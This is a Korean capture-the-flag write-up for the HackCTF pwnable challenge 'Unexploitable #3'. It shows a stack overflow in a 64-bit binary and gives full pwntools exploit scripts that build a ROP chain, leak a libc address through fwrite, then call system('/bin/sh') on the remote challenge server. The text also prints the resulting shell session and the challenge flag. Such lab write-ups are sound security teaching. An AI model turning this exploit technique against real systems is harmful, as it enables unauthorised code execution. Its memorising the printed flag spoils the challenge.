#Unexploitable #3

---

보호기법은 다음과 같다.
<pre>
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</pre>

`main()`의 코드를 살펴보자.
<pre>
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-10h]

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  fwrite("Impossible RTL ha? Nothing for you!\n", 1uLL, 0x24uLL, stdout);
  fgets(&s, 256, stdin);
  return 0;
}
</pre>

`fgets()`를 이용해서 256bytes만큼 입력을 받고있따. 여기서 bof취약점을 이용해서 rop를 진행해야 한다. 그리고 다음과 같은 `gift()`함수가 있다.

<pre>
size_t gift()
{
  return fwrite("Useless gadget for you!", 1uLL, 0x17uLL, stdout);
}
</pre>

Unexploitable #1과 #2에서는 `system()` gadget을 주었었는데 이번에는 주지 않는다.

---

우선 libc_base를 leak하는 방법에 대해서 생각해보자. 

출력을 할 수 있는 함수는 `fwrite()`밖에 없다. 때문에 이 함수를 이용해야 하는데 4번째 인자까지 조정하려면 pop rcx gadget이 필요하지만 이러한 gadget이 존재하지 않는다. 때문에 이 gadget을 대체할 수 있는 다음과 같은 gadget을 발견하였다.

<pre>
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/35.Unexploitable_3$ ROPgadget --binary Unexploitable_3 | grep "rcx"
...
0x0000000000400658 : mov rcx, qword ptr [rdi] ; ret
...
</pre>

**mov\_rcx\_ret=0x400658**

이 mov\_rcx\_ret gadget과 pop\_rdi\_ret gadget과 \_\_libc\_csu\_init의 다음 부분을 이용하여 `fwrite()`의 인자들을 모두 조정할 수 있다.

<pre>
gdb-peda$ pd __libc_csu_init
Dump of assembler code for function __libc_csu_init:
...
   0x0000000000400720 <+64>:	mov    rdx,r13
   0x0000000000400723 <+67>:	mov    rsi,r14
   0x0000000000400726 <+70>:	mov    edi,r15d
   0x0000000000400729 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040072d <+77>:	add    rbx,0x1
   0x0000000000400731 <+81>:	cmp    rbx,rbp
   0x0000000000400734 <+84>:	jne    0x400720 <__libc_csu_init+64>
   0x0000000000400736 <+86>:	add    rsp,0x8
   0x000000000040073a <+90>:	pop    rbx
   0x000000000040073b <+91>:	pop    rbp
   0x000000000040073c <+92>:	pop    r12
   0x000000000040073e <+94>:	pop    r13
   0x0000000000400740 <+96>:	pop    r14
   0x0000000000400742 <+98>:	pop    r15
   0x0000000000400744 <+100>:	ret    
End of assembler dump.
</pre>

**libc\_csu\_init\_down=0x40073a <br>
libc\_csu\_init\_up=0x400720**

rdi는 4bytes까지밖에 옮길 수 없다는 것에 유의해야 하지만 출력하고자 하는 주소를 담고있는 got의 주소는 4bytes 내의 길이를 가지고 있기 때문에 상관이 없다.

pop\_rdi\_ret gadget과 필요한 plt, got위치는 다음과 같다.
<pre>
gdb-peda$ ropsearch "pop rdi; ret"
Searching for ROP gadget: 'pop rdi; ret' in: binary ranges
0x00400743 : (b'5fc3')	pop rdi; ret
</pre>

**pop\_rdi\_ret=0x400743**

<pre>
gdb-peda$ p main
$1 = {<text variable, no debug info>} 0x40065f <main>

gdb-peda$ got

/home/sjy0175/Desktop/HackCTF/Pwnable/35.Unexploitable_3/Unexploitable_3:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601050 R_X86_64_COPY     stdout@@GLIBC_2.2.5
0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
0000000000601018 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
0000000000601020 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
0000000000601028 R_X86_64_JUMP_SLOT  setvbuf@GLIBC_2.2.5
0000000000601030 R_X86_64_JUMP_SLOT  fwrite@GLIBC_2.2.5

gdb-peda$ plt
Breakpoint 1 at 0x4004f0 (__libc_start_main@plt)
Breakpoint 2 at 0x400500 (fgets@plt)
Breakpoint 3 at 0x400520 (fwrite@plt)
Breakpoint 4 at 0x400510 (setvbuf@plt)
</pre>
</pre>

**main=0x40065f** <br>
**stdout\_got=0x601050**<br>
**fwrite\_got=0x601030** <br>
**fgets\_got=0x601020**

`fgets()`의 주소를 leak하기 까지의 코드는 다음과 같다.

<pre>
from pwn import*

#p=process('./Unexploitable_3')
p=remote('ctf.j0n9hyun.xyz',3034)
#gdb.attach(p)


main=0x40065f
mov_rcx_ret=0x400658
pop_rdi_ret=0x400743
libc_csu_init_down=0x40073a
libc_csu_init_up=0x400720
stdout_got=0x601050
fwrite_got=0x601030
fgets_got=0x601020

p.recvline()

payload='A'*24
payload+=p64(pop_rdi_ret)
payload+=p64(stdout_got)
payload+=p64(mov_rcx_ret)
payload+=p64(libc_csu_init_down)
payload+=p64(0)          #rbx=0
payload+=p64(1)          #rbp=rbx
payload+=p64(fwrite_got) #r12=call
payload+=p64(6)          #r13=rdx
payload+=p64(1)          #r14=rsi
payload+=p64(fgets_got)  #r15=rdi
payload+=p64(libc_csu_init_up)
payload+=p64(0)*7
payload+=p64(main)

p.sendline(payload)

fgets_address=u64(p.recv(6).ljust(8,'\x00'))

log.info("fgets_address is "+str(hex(fgets_address)))

p.interactive()
</pre>

`fgets()`의 주소는 다음과 같다.
<pre>
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/35.Unexploitable_3$ python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3034: Done
[*] fgets_address is 0x7f68e4a79ad0
[*] Switching to interactive mode
Impossible RTL ha? Nothing for you!
$ hi
[*] Got EOF while reading in interactive
</pre>

이 주소를 이용하여 온라인 사이트에서 `system()`의 offset과 "/bin/sh"의 offset과 `fgets()`의 offset을 구할 수 있었다.

**system\_offset=0x45390 <br>
fgets\_offset=0x6dad0 <br>
binsh\_offset=0x18cd57**

이제 이 정보들을 통해서 `system()`의 주소와 "/bin/sh"의 주소를 알았기 때문에 got overwrite를 통해서 system(/bin/sh)를 실행할 것이다.

익스플로잇 코드는 다음과 같다.

<pre>
from pwn import*

#p=process('./Unexploitable_3')
p=remote('ctf.j0n9hyun.xyz',3034)
#gdb.attach(p)


main=0x40065f
mov_rcx_ret=0x400658
pop_rdi_ret=0x400743
libc_csu_init_down=0x40073a
libc_csu_init_up=0x400720
stdout_got=0x601050
fwrite_got=0x601030
fgets_got=0x601020
system_offset=0x45390
fgets_offset=0x6dad0
binsh_offset=0x18cd57

p.recvline()

payload='A'*24
payload+=p64(pop_rdi_ret)
payload+=p64(stdout_got)
payload+=p64(mov_rcx_ret)
payload+=p64(libc_csu_init_down)
payload+=p64(0)          #rbx=0
payload+=p64(1)          #rbp=rbx
payload+=p64(fwrite_got) #r12=call
payload+=p64(6)          #r13=rdx
payload+=p64(1)          #r14=rsi
payload+=p64(fgets_got)  #r15=rdi
payload+=p64(libc_csu_init_up)
payload+=p64(0)*7
payload+=p64(main)

p.sendline(payload)

fgets_address=u64(p.recv(6).ljust(8,'\x00'))

libc_base=fgets_address-fgets_offset
system_address=libc_base+system_offset
binsh_address=libc_base+binsh_offset

log.info("fgets_address is "+str(hex(fgets_address)))
log.info("system_address is "+str(hex(system_address)))

p.recvuntil('!\n')

payload2='A'*24
payload2+=p64(pop_rdi_ret)
payload2+=p64(binsh_address)
payload2+=p64(system_address)

p.sendline(payload2)

p.interactive()
</pre>

flag는 다음과 같다.

<pre>
sjy0175@sjy0175-VirtualBox:~/Desktop/HackCTF/Pwnable/35.Unexploitable_3$ python ex.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3034: Done
[*] fgets_address is 0x7f374cb55ad0
[*] system_address is 0x7f374cb2d390
[*] Switching to interactive mode
$ whoami
attack
$ cat flag
HackCTF{bss_4lw4y5_h4s_std1n/std0ut}
</pre>

**flag: HackCTF{bss\_4lw4y5\_h4s\_std1n/std0ut}**

